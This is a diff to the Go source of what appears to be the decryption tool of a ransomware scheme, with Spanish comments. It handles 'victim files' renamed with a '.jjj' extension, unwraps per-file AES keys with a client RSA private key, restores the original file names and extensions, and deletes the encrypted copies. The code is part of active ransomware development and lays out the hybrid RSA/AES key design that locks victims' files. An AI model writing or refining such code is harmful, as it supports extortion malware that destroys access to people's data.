@@ -18,10 +18,11 @@ import (
 
 // Estructuras para almacenar la información de cifrado
 type EncryptionInfo struct {
-	Path string `json:"path"`
-	Key  []byte `json:"key"` // Para master.key: ciphertext (IV || AES-cifrado de la clave privada del cliente).
-	// Para archivos víctimas: ciphertext (IV || AES-cifrado del contenido original).
+	Path    string `json:"path"`
+	Key     []byte `json:"key"`
+	OrigExt string `json:"orig_ext,omitempty"`
 }
+
 
 type EncryptionInfos []EncryptionInfo
 
@@ -140,46 +141,46 @@ func main() {
 		if info.Path == "master.key" {
 			continue
 		}
-		// Asegurarse de que el archivo pertenece a la ruta indicada.
 		if !filepath.HasPrefix(info.Path, ruta) {
 			continue
 		}
 		fmt.Println("Desencriptando:", info.Path)
-
-		// Para archivos víctimas:
-		// El contenido del archivo es la RSA-encriptación de la clave simétrica (ek).
+	
+		// Leer la clave simétrica encriptada (RSA)
 		encryptedSymKey, err := os.ReadFile(info.Path)
 		if err != nil {
-			log.Println("Error al leer el archivo cifrado:", err)
+			log.Println("Error al leer el archivo cifrado:", info.Path, err)
 			continue
 		}
-
-		// Desencriptar la clave simétrica usando la clave privada del cliente.
+	
+		// Desencriptar la clave simétrica usando la clave privada del cliente
 		aesKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, clientPrivateKey, encryptedSymKey, nil)
 		if err != nil {
 			log.Println("Error al desencriptar la clave AES para", info.Path, ":", err)
 			continue
 		}
-
-		// Desencriptar el contenido real (almacenado en file.keys para ese archivo) usando aesKey.
-		// Desencriptar el contenido real (almacenado en file.keys para ese archivo) usando aesKey.
-decryptedData, err := decryptAES(info.Key, aesKey)
-if err != nil {
-    log.Println("Error al desencriptar el archivo", info.Path, ":", err)
-    continue
-}
-
-// Remover la extensión ".jjj" para restaurar el nombre original
-originalPath := info.Path
-if strings.HasSuffix(originalPath, ".jjj") {
-    originalPath = originalPath[:len(originalPath)-len(".jjj")]
-}
-
-if err := os.WriteFile(originalPath, decryptedData, 0666); err != nil {
-    log.Println("Error al escribir el archivo desencriptado", originalPath, ":", err)
-} else {
-    fmt.Println("Archivo desencriptado:", originalPath)
-}
-
-	}
-}
+	
+		// Desencriptar el contenido real usando aesKey.
+		decryptedData, err := decryptAES(info.Key, aesKey)
+		if err != nil {
+			log.Println("Error al desencriptar el archivo", info.Path, ":", err)
+			continue
+		}
+	
+		// Reconstruir el nombre original: quitar ".jjj" y agregar la extensión original almacenada
+		base := strings.TrimSuffix(info.Path, ".jjj")
+		originalPath := base + info.OrigExt
+	
+		// Escribir el archivo desencriptado con el nombre original
+		if err := os.WriteFile(originalPath, decryptedData, 0666); err != nil {
+			log.Println("Error al escribir el archivo desencriptado", originalPath, ":", err)
+		} else {
+			fmt.Println("Archivo desencriptado:", originalPath)
+			// Eliminar el archivo encriptado (con extensión ".jjj")
+			if err := os.Remove(info.Path); err != nil {
+				log.Println("Error al eliminar el archivo encriptado", info.Path, ":", err)
+			} else {
+				fmt.Println("Archivo encriptado eliminado:", info.Path)
+			}
+		}
+	}}
